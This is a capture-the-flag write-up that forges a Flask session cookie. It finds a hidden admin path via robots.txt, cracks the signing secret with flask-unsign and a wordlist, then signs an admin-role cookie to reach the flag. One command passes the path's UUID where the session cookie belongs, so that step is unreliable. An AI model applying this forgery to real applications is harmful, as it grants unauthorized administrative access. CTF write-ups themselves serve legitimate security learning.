# Super Cookie

## Investigation

I started by checking the homepage:

```bash
curl -i http://172.198.60.104:3000
```

It displayed a collection of office stories, but there was no login or admin link. I also didn't get a session cookie.

I checked `robots.txt` next:

```bash
curl -i http://172.198.60.104:3000/robots.txt
```

It revealed a hidden admin endpoint:

```text
Disallow: /admin/8f14e45f-ea9d-4b21-9c6d-62f8f7a6c311
```

I opened that endpoint using cURL:

```bash
curl -i http://172.198.60.104:3000/admin/8f14e45f-ea9d-4b21-9c6d-62f8f7a6c311
```

This time, the server issued a cookie named `session`. Its value had two dots, so I suspected it was a Flask session cookie.

I installed `flask-unsign` in a virtual environment and decoded the cookie:

```bash
python -m venv .venv
source .venv/bin/activate
pip install flask-unsign

flask-unsign --decode --cookie 'my_cookie'
```

The decoded data was:

```json
{
  "role": "guest",
  "username": "visitor"
}
```

I tried signing a test cookie with a wrong secret and sending it to the admin endpoint. The application rejected it, so I knew I needed the correct signing secret.

I made a small wordlist called `secrets.txt` with common secrets and some guesses related to the challenge, then ran:

```bash
flask-unsign --unsign \
  --cookie '8f14e45f-ea9d-4b21-9c6d-62f8f7a6c311' \
  --wordlist secrets.txt
```

It found the secret after 23 attempts:

```text
[+] Found secret key after 23 attempts
'secret123'
```

Now that I had the secret, I created a cookie with the admin role:

```bash
flask-unsign --sign \
  --cookie "{'role':'admin','username':'admin'}" \
  --secret 'secret123'
```

I sent the generated cookie to the admin endpoint:

```bash
curl -i \
  -H "Cookie: session=FORGED_ADMIN_COOKIE" \
  http://172.198.60.104:3000/admin/8f14e45f-ea9d-4b21-9c6d-62f8f7a6c311
```

This time, I got access to the admin area and found the flag.

## Flag

```text
InIt{C00k1e_F0rg3ry_1s_Sup3r}
```